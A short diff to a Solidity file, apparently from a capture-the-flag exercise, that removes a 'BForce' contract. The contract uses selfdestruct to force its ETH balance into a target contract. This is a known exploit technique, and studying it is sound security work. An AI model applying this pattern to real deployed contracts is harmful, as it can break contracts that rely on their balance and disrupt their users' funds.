@@ -12,13 +12,3 @@ contract Force {
 
     }
 
-contract BForce {
-    constructor() payable {
-        // Contract receives ETH on deployment
-    }
-
-    function attack(address target) external {
-        // Forces all ETH in this contract to the target
-        selfdestruct(payable(target));
-    }
-}
